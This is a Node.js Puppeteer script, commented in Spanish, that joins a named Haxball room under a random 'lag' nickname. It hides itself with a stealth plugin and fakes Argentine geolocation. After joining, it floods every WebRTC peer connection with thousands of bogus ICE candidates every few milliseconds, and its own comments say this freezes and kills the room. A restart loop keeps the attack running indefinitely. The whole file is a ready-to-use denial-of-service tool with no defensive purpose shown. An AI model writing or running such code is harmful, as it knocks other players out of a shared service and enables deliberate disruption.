// archivo.js → entra y congela la sala en <15 segundos totales
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ROOM_URL = "https://www.haxball.com/play?c=HTEUs83jHaw";
const NICK = "lag" + Math.floor(Math.random() * 9999);

(async () => {
  while (true) {
    let browser;
    try {
      browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
      });

      const page = await browser.newPage();
      await page.evaluateOnNewDocument(() => localStorage.setItem("geo", JSON.stringify({lat:-34.65,lon:-58.38,code:"ar"})));
      await page.goto(ROOM_URL, {waitUntil:"networkidle2", timeout:0});

      const frame = await page.frames().find(f => f.url().includes("headless"));
      if (!frame) throw "Iframe no encontrado";

      await frame.waitForSelector('input[data-hook="input"][maxlength="25"]', {timeout:20000});
      await frame.type('input[data-hook="input"][maxlength="25"]', NICK);
      await frame.evaluate(() => document.querySelector('button[data-hook="ok"]')?.click());

      console.log(`✅ ${NICK} entró → empezando ICE flood en 10s...`);
      await page.waitForTimeout(10000); // ← tiempo perfecto para que todos los peers existan

      // === ICE FLOOD BESTIAL (la sala muere aquí) ===
      setInterval(() => page.evaluate(() => {
        for (let k in window) if (window[k]?.addIceCandidate) {
          for (let i = 0; i < 2800; i++) {
            window[k].addIceCandidate({candidate:"candidate:1 1 udp 1 0.0.0.0 1 typ host", sdpMid:null, sdpMLineIndex:999}).catch(()=>{});
          }
        }
      }), 8);

      await new Promise(() => {}); // vivo forever

    } catch (e) {
      console.log("Caído, reiniciando en 5s...", e.message);
      if (browser) await browser.close();
      await new Promise(r => setTimeout(r, 5000));
    }
  }
})();
